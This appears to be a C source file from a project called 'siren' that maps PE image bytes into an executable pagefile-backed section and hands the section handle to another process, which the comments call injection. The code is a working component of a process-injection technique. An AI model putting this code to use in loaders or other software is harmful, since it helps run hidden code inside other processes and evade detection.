/*
 * src/handoff/section_handoff.c
 *
 * Pagefile-backed section creation + cross-process handle handoff.
 *
 * Using NtCreateSection directly (via GetProcAddress on ntdll) avoids
 * pulling in the DDK headers.  We only need the SEC_COMMIT / ViewUnmap
 * constants, defined locally.
 */

#include "handoff/section_handoff.h"

#include <string.h>

/* NT section / view constants we need (subset). */
#ifndef SEC_COMMIT
#  define SEC_COMMIT 0x8000000
#endif

/* NtCreateSection / NtMapViewOfSection typedefs (x64 only). */
typedef LONG (NTAPI *PFN_NtCreateSection)(
    PHANDLE            SectionHandle,
    ACCESS_MASK        DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PLARGE_INTEGER     MaximumSize,
    ULONG              SectionPageProtection,
    ULONG              AllocationAttributes,
    HANDLE             FileHandle);

typedef LONG (NTAPI *PFN_NtMapViewOfSection)(
    HANDLE          SectionHandle,
    HANDLE          ProcessHandle,
    PVOID          *BaseAddress,
    ULONG_PTR       ZeroBits,
    SIZE_T          CommitSize,
    PLARGE_INTEGER  SectionOffset,
    PSIZE_T         ViewSize,
    DWORD           InheritDisposition,   /* ViewUnmap = 2 */
    ULONG           AllocationType,
    ULONG           Win32Protect);

typedef LONG (NTAPI *PFN_NtUnmapViewOfSection)(HANDLE Process, PVOID Base);
typedef LONG (NTAPI *PFN_NtClose)(HANDLE Handle);

#define VIEW_UNMAP 2

static PFN_NtCreateSection     g_NtCreateSection;
static PFN_NtMapViewOfSection  g_NtMapViewOfSection;
static PFN_NtUnmapViewOfSection g_NtUnmapViewOfSection;
static PFN_NtClose             g_NtClose;
static BOOL                    g_resolved;

static BOOL resolve_nt_funcs(void)
{
    if (g_resolved)
        return TRUE;
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll)
        return FALSE;
    g_NtCreateSection      = (PFN_NtCreateSection)
        GetProcAddress(ntdll, "NtCreateSection");
    g_NtMapViewOfSection   = (PFN_NtMapViewOfSection)
        GetProcAddress(ntdll, "NtMapViewOfSection");
    g_NtUnmapViewOfSection = (PFN_NtUnmapViewOfSection)
        GetProcAddress(ntdll, "NtUnmapViewOfSection");
    g_NtClose              = (PFN_NtClose)
        GetProcAddress(ntdll, "NtClose");
    g_resolved = g_NtCreateSection && g_NtMapViewOfSection &&
                 g_NtUnmapViewOfSection && g_NtClose;
    return g_resolved;
}

siren_status_t siren_section_create_and_handoff(HANDLE      hProcess,
                                                const void *pe_bytes,
                                                size_t      pe_size,
                                                HANDLE     *out_target_handle)
{
    if (!hProcess || !pe_bytes || pe_size == 0 || !out_target_handle)
        return SIREN_E_NULL_ARG;

    *out_target_handle = NULL;

    if (!resolve_nt_funcs())
        return SIREN_E_HANDOFF_ALLOC;

    /* ── 1. Create pagefile-backed section ───────────────────────── */
    HANDLE         hSection = NULL;
    LARGE_INTEGER  max_size;
    max_size.QuadPart = (LONGLONG)pe_size;

    LONG status = g_NtCreateSection(
        &hSection,
        SECTION_ALL_ACCESS,
        NULL,           /* no object attributes (anonymous) */
        &max_size,
        PAGE_EXECUTE_READWRITE,   /* section protection */
        SEC_COMMIT,               /* pagefile-backed */
        NULL);                    /* no file */

    if (status < 0 || !hSection)
        return SIREN_E_HANDOFF_ALLOC;

    /* ── 2. Map into injector's address space (RW) ───────────────── */
    PVOID  view     = NULL;
    SIZE_T view_sz  = 0;

    status = g_NtMapViewOfSection(
        hSection,
        GetCurrentProcess(),
        &view,
        0, 0, NULL,
        &view_sz,
        VIEW_UNMAP,
        0,
        PAGE_READWRITE);

    if (status < 0 || !view) {
        g_NtClose(hSection);
        return SIREN_E_HANDOFF_MAP;
    }

    /* ── 3. Copy PE bytes ─────────────────────────────────────────── */
    memcpy(view, pe_bytes, pe_size);

    /* ── 4. Unmap from injector ───────────────────────────────────── */
    g_NtUnmapViewOfSection(GetCurrentProcess(), view);

    /* ── 5. Duplicate handle into target ──────────────────────────── */
    HANDLE hTarget = NULL;
    if (!DuplicateHandle(GetCurrentProcess(), hSection,
                         hProcess, &hTarget,
                         0, FALSE, DUPLICATE_SAME_ACCESS)) {
        g_NtClose(hSection);
        return SIREN_E_HANDOFF_DUP;
    }

    /* ── 6. Injector closes its own handle ────────────────────────── */
    g_NtClose(hSection);

    *out_target_handle = hTarget;
    return SIREN_OK;
}
